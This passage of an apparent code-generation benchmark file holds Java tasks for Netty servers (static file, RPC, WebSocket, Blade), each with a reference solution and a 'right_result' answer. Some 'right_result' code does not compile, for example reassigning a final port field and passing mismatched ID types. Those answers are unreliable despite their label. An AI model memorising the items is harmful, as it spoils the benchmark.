 ctx.channel().close();\n                    return;\n                }\n                sn = iDevice.getIDevice().getSerialNumber();\n            }\n\n            JSONObject obj = new JSONObject();\n            obj.put(\"sn\", sn);\n            obj.put(\"key\", key);\n\n            ctx.channel().writeAndFlush(new TextWebSocketFrame(\"open://\" + obj.toJSONString()));\n\n            Protocol protocol = new Protocol();\n            protocol.setSn(sn);\n            protocol.setKey(key);\n            protocol.setBroswerSocket(ctx);\n            protocolList.add(protocol);\n\n            LocalClient localClient = new LocalClient(protocol);\n            protocol.setLocalClient(localClient);\n        }\n\n        void executeCommand(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = null;\n            for (Protocol p : protocolList) {\n                if (p.getBroswerSocket() != null && p.getBroswerSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n                if (p.getClientSocket() != null && p.getClientSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n            }\n            if (protocol != null) {\n                protocol.getLocalClient().executeCommand(ctx, command);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.atomic.AtomicInteger;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LocalServer {\n    private final int port;\n    private List<Protocol> protocolList = new ArrayList<>();\n    private final Logger logger = LoggerFactory.getLogger(LocalServer.class);\n\n    public LocalServer(int port) {\n        this.port = port;\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new LocalServerWebsocketEventImp());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(port).sync();\n            logger.info(\"LocalServer started and listening on port {}\", port);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private class LocalServerWebsocketEventImp extends SimpleChannelInboundHandler<TextWebSocketFrame> {\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            logger.info(\"Client connected: {}\", ctx.channel().id().asShortText());\n        }\n\n        @Override\n        public void handlerRemoved(ChannelHandlerContext ctx) {\n            logger.info(\"Client disconnected: {}\", ctx.channel().id().asShortText());\n            onDisconnect(ctx);\n        }\n\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, TextWebSocketFrame msg) {\n            String text = msg.text();\n            logger.info(\"Received text message: {}\", text);\n            onTextMessage(ctx, text);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\"Exception caught\", cause);\n            ctx.close();\n        }\n\n        public void onConnect(ChannelHandlerContext ctx) {\n            // You can override or call custom logic here if needed\n        }\n\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            for (int i = 0; i < protocolList.size(); i++) {\n                Protocol protocol = protocolList.get(i);\n                if (protocol.getChannelId().equals(ctx.channel().id())) {\n                    protocolList.remove(i);\n                    break;\n                }\n            }\n        }\n\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = parseCommand(text);\n            if (command != null) {\n                executeCommand(ctx, command);\n            } else {\n                logger.warn(\"Received invalid command: {}\", text);\n            }\n        }\n\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            // Handle binary messages such as file uploads\n            logger.info(\"Received binary message of size {}\", data.length);\n            // Add implementation to process the binary data\n        }\n\n        public void initLocalClient(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = new Protocol(ctx.channel().id(), command);\n            protocolList.add(protocol);\n            logger.info(\"Initialized new client protocol with ID: {}\", ctx.channel().id().asShortText());\n        }\n\n        public void executeCommand(ChannelHandlerContext ctx, Command command) {\n            boolean found = false;\n            for (Protocol protocol : protocolList) {\n                if (protocol.getChannelId().equals(ctx.channel().id())) {\n                    protocol.execute(command);\n                    found = true;\n                    break;\n                }\n            }\n            if (!found) {\n                initLocalClient(ctx, command);\n            }\n        }\n\n        private Command parseCommand(String input) {\n            // Add your parsing logic here\n            return new Command(input);\n        }\n    }\n\n    static class Protocol {\n        private final String channelId;\n        private final Command initialCommand;\n\n        public Protocol(String channelId, Command command) {\n            this.channelId = channelId;\n            this.initialCommand = command;\n        }\n\n        public String getChannelId() {\n            return channelId;\n        }\n\n        public void execute(Command command) {\n            // Implement command execution logic\n        }\n    }\n\n    static class Command {\n        private final String rawInput;\n\n        public Command(String input) {\n            this.rawInput = input;\n        }\n\n        public String getRawInput() {\n            return rawInput;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 161,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests for static file serving, with optional SSL support.\n\nClass Description: HttpStaticFileServer is a Netty-based server that serves static files over HTTP or HTTPS. It uses a boss-worker thread model for handling connections and includes SSL configuration capabilities.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL/TLS encryption should be enabled\n- PORT: [int] - The port number on which the server will listen (defaults to 8080 for HTTP or 8443 for HTTPS)\n\nMethods:\n- start(): [void] - Starts the Netty server with the configured settings. Throws Exception if startup fails.\n  - Input: None\n  - Output: None (but binds to specified port and starts serving requests)\n  - Side effects: Creates event loop groups, binds to port, and keeps server running until shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslProvider;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpStaticFileServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n                .sslProvider(SslProvider.JDK).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpStaticFileServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\nimport java.io.File;\nimport java.io.IOException;\n\npublic class HttpStaticFileServer {\n    private final boolean ssl;\n    private final int port;\n\n    public HttpStaticFileServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (ssl) {\n                         ch.pipeline().addLast(\"ssl\", sslContext().newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new HttpRequestDecoder());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new HttpResponseEncoder());\n                     ch.pipeline().addLast(new StaticFileServerHandler(new File(\".\").getAbsolutePath()));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server started on port \" + port + (ssl ? \" with SSL\" : \"\"));\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private SslContext sslContext() throws IOException {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        return SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean useSsl = false;\n        int port = 8080;\n        if (args.length > 0 && args[0].equalsIgnoreCase(\"ssl\")) {\n            useSsl = true;\n            port = 8443;\n        }\n        new HttpStaticFileServer(useSsl, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Implement a Netty-based TCP server for RPC (Remote Procedure Call) communication that handles incoming client connections, processes RPC requests, and manages server resources efficiently.\n\nClass Description: NettyRpcServer is a Spring component that establishes a TCP server using Netty framework to handle RPC communications. It manages service registration, client connections, and provides graceful shutdown capabilities.\n\nAttributes:\n- PORT: [int] - The port number on which the server listens for incoming connections (default: 9998).\n- serviceProvider: [ServiceProvider] - An instance responsible for managing and providing registered RPC services (singleton instance of ZkServiceProviderImpl).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. Configures event loop groups, server bootstrap, channel pipeline with handlers for encoding/decoding RPC messages, and idle state detection. Binds to the specified host and port, and keeps the server running until shutdown.\n  Input: None\n  Output: None\n\n- registerService(RpcServiceConfig rpcServiceConfig): [void] - Registers an RPC service with the service provider.\n  Input: rpcServiceConfig [RpcServiceConfig] - Configuration object containing RPC service details to be registered.\n  Output: None",
    "Canonical_solution": "import github.javaguide.config.CustomShutdownHook;\nimport github.javaguide.config.RpcServiceConfig;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.provider.ServiceProvider;\nimport github.javaguide.provider.impl.ZkServiceProviderImpl;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport github.javaguide.utils.RuntimeUtil;\nimport github.javaguide.utils.concurrent.threadpool.ThreadPoolFactoryUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport java.net.InetAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\n@Component\npublic class NettyRpcServer {\n\n    public static final int PORT = 9998;\n\n    private final ServiceProvider serviceProvider = SingletonFactory.getInstance(ZkServiceProviderImpl.class);\n\n    @SneakyThrows\n    public void start() {\n        CustomShutdownHook.getCustomShutdownHook().clearAll();\n        String host = InetAddress.getLocalHost().getHostAddress();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        DefaultEventExecutorGroup serviceHandlerGroup = new DefaultEventExecutorGroup(\n                RuntimeUtil.cpus() * 2,\n                ThreadPoolFactoryUtil.createThreadFactory(\"service-handler-group\", false)\n        );\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            p.addLast(new RpcMessageEncoder());\n                            p.addLast(new RpcMessageDecoder());\n                            p.addLast(serviceHandlerGroup, new NettyRpcServerHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(host, PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            log.error(\"occur exception when start server:\", e);\n        } finally {\n            log.error(\"shutdown bossGroup and workerGroup\");\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            serviceHandlerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.springframework.stereotype.Component;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyRpcServer {\n    private static final int PORT = 9998;\n    private final ServiceProvider serviceProvider;\n\n    public NettyRpcServer(ServiceProvider serviceProvider) {\n        this.serviceProvider = serviceProvider;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(PORT))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(60, 60, 60, TimeUnit.SECONDS));\n                            pipeline.addLast(\"decoder\", new RpcMessageDecoder());\n                            pipeline.addLast(\"encoder\", new RpcMessageEncoder());\n                            pipeline.addLast(\"handler\", new RpcRequestHandler(serviceProvider));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind().sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}\n```"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that can handle incoming client connections, support SSL/TLS encryption, and provide graceful shutdown capabilities.\n\nClass Description: The NettyServer class is responsible for creating and managing a TCP server using Netty framework. It handles server initialization, SSL configuration (if enabled), thread pool management, and proper resource cleanup during shutdown.\n\nAttributes:\n- blade: [Blade] - Reference to the Blade framework instance for web application context\n- environment: [Environment] - Configuration environment containing server settings\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- channel: [Channel] - Netty channel representing the server socket\n- DEFAULT_ACCEPT_THREAD_COUNT: [int] - Default number of threads for accepting connections\n- DEFAULT_IO_THREAD_COUNT: [int] - Default number of threads for I/O operations\n\nMethods:\n- startServer(): [void] -> [void] - Starts the Netty server with configured settings, including optional SSL/TLS setup. Reads configuration from environment and initializes thread pools.\n- stop(): [void] -> [void] - Gracefully shuts down the server by releasing all thread pool resources and closing the server channel.",
    "Canonical_solution": "import com.hellokaton.blade.Blade;\nimport com.hellokaton.blade.Environment;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoop;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport lombok.extern.slf4j.Slf4j;\n\nimport static com.hellokaton.blade.kit.BladeKit.getStartedSymbol;\nimport static com.hellokaton.blade.mvc.BladeConst.*;\n\n@Slf4j\npublic class NettyServer {\n\n    private Blade blade;\n    private Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = 0;\n\n    public void startServer() throws Exception {\n        boolean SSL = environment.getBoolean(ENV_KEY_SSL, false);\n        SslContext sslCtx = null;\n        if (SSL) {\n            String certFilePath = environment.get(ENV_KEY_SSL_CERT, null);\n            String privateKeyPath = environment.get(ENV_KEY_SSL_PRIVATE_KEY, null);\n            String privateKeyPassword = environment.get(ENV_KEY_SSL_PRIVATE_KEY_PASS, null);\n            \n            log.info(\"{}SSL CertChainFile  Path: {}\", getStartedSymbol(), certFilePath);\n            log.info(\"{}SSL PrivateKeyFile Path: {}\", getStartedSymbol(), privateKeyPath);\n            sslCtx = SslContextBuilder.forServer(new File(certFilePath), new File(privateKeyPath), privateKeyPassword).build();\n        }\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n\n        int acceptThreadCount = environment.getInt(ENV_KEY_NETTY_ACCEPT_THREAD_COUNT, DEFAULT_ACCEPT_THREAD_COUNT);\n        int ioThreadCount = environment.getInt(ENV_KEY_NETTY_IO_THREAD_COUNT, DEFAULT_IO_THREAD_COUNT);\n\n        this.bossGroup = new NioEventLoopGroup(acceptThreadCount, new NamedThreadFactory(\"boss@\"));\n        this.workerGroup = new NioEventLoopGroup(ioThreadCount, new NamedThreadFactory(\"worker@\"));\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.TCP_NODELAY, environment.getBoolean(ENV_KEY_NETTY_TCP_NODELAY, true))\n                .childOption(ChannelOption.SO_KEEPALIVE, environment.getBoolean(ENV_KEY_NETTY_SO_KEEPALIVE, true))\n                .childHandler(new HttpServerInitializer(sslCtx, blade));\n\n        String address = environment.get(ENV_KEY_SERVER_ADDRESS, DEFAULT_SERVER_ADDRESS);\n        Integer port = environment.getInt(ENV_KEY_SERVER_PORT, DEFAULT_SERVER_PORT);\n\n        channel = bootstrap.bind(address, port).sync().channel();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class NettyServer {\n    private final Blade blade;\n    private final Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = Runtime.getRuntime().availableProcessors() * 2;\n\n    public NettyServer(Blade blade, Environment environment) {\n        this.blade = blade;\n        this.environment = environment;\n    }\n\n    public void startServer() {\n        try {\n            int port = environment.getProperty(\"server.port\", Integer.class, 8080);\n            boolean sslEnabled = environment.getProperty(\"server.ssl.enabled\", Boolean.class, false);\n\n            bossGroup = new NioEventLoopGroup(DEFAULT_ACCEPT_THREAD_COUNT);\n            workerGroup = new NioEventLoopGroup(DEFAULT_IO_THREAD_COUNT);\n\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            if (sslEnabled) {\n                                SslContext sslCtx = SslContextBuilder.forServer(getSslCertificate()).build();\n                                ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                            }\n                            // Add custom handler here\n                            ch.pipeline().addLast(new CustomServerHandler(blade));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            channel = future.channel();\n            channel.closeFuture().sync();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start Netty server\", e);\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private SelfSignedCertificate getSslCertificate() throws Exception {\n        return new SelfSignedCertificate();\n    }\n}\n```"
  },
  {
    "Task_id": 165,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable thread pool, and managing server lifecycle.\n\nClass Description: NettyServer is a TCP server implementation that uses Netty framework for non-blocking I/O operations. It manages server connections, processes incoming requests through a thread pool, and provides lifecycle control (open/close) for the server.\n\nAttributes:\n- channelManage: [NettyServerChannelManage] - Manages active server channels and connections\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- serverChannel: [Channel] - The main server channel listening for connections\n- messageHandler: [MessageHandler] - Handler for processing incoming messages\n- threadPoolExecutor: [ThreadPoolExecutor] - Thread pool for request processing\n- rejectCounter: [AtomicInteger] - Counter for rejected requests\n- logger: [Logger] - Logger instance for server operations\n- url: [URL] - Configuration URL containing server parameters\n- state: [ChannelState] - Current state of the server channel\n- codec: [Codec] - Codec for message serialization/deserialization\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools and Netty components, binds to configured port\n- close([int] timeout) -> [void] - Shuts down the server gracefully, releasing all resources\n- cleanup() -> [void] - Internal method for resource cleanup during server shutdown\n- NettyServer([URL] url, [MessageHandler] messageHandler) - Constructor initializing server with configuration and message handler",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.hongxi.summer.common.ChannelState;\nimport org.hongxi.summer.common.SummerConstants;\nimport org.hongxi.summer.common.URLParamType;\nimport org.hongxi.summer.common.threadpool.DefaultThreadFactory;\nimport org.hongxi.summer.common.threadpool.StandardThreadPoolExecutor;\nimport org.hongxi.summer.exception.SummerFrameworkException;\nimport org.hongxi.summer.rpc.Request;\nimport org.hongxi.summer.rpc.Response;\nimport org.hongxi.summer.rpc.URL;\nimport org.hongxi.summer.transport.AbstractServer;\nimport org.hongxi.summer.transport.MessageHandler;\nimport org.hongxi.summer.transport.TransportException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n\n    protected NettyServerChannelManage channelManage;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private ThreadPoolExecutor threadPoolExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            logger.warn(\"server channel already open, url={}\", url);\n            return state.isAliveState();\n        }\n\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        logger.info(\"server channel start open, url={}\", url);\n        boolean shareChannel = url.getBooleanParameter(\n                URLParamType.shareChannel.getName(), URLParamType.shareChannel.boolValue());\n        int maxContentLength = url.getIntParameter(\n                URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.intValue());\n        int maxServerConnections = url.getIntParameter(\n                URLParamType.maxServerConnections.getName(), URLParamType.maxServerConnections.intValue());\n        int maxQueueSize = url.getIntParameter(\n                URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.intValue());\n\n        int minWorkerThreads;\n        int maxWorkerThreads;\n        if (shareChannel) {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        } else {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        }\n\n        if (threadPoolExecutor == null || threadPoolExecutor.isShutdown()) {\n            threadPoolExecutor = new StandardThreadPoolExecutor(minWorkerThreads, maxWorkerThreads,\n                    maxQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        }\n        threadPoolExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnections);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        ChannelPipeline pipeline = socketChannel.pipeline();\n                        pipeline.addLast(\"channel_manage\", channelManage);\n                        pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                        pipeline.addLast(\"encoder\", new NettyEncoder());\n                        pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, threadPoolExecutor));\n                    }\n                });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        state = ChannelState.ALIVE;\n        logger.info(\"server channel finished open: url={}\", url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) return;\n\n        try {\n            cleanup();\n            if (state.isUnInitState()) {\n                logger.info(\"Server close failed, state={}, uri={}\", state.value(), url.getUri());\n                return;\n            }\n\n            state = ChannelState.CLOSE;\n            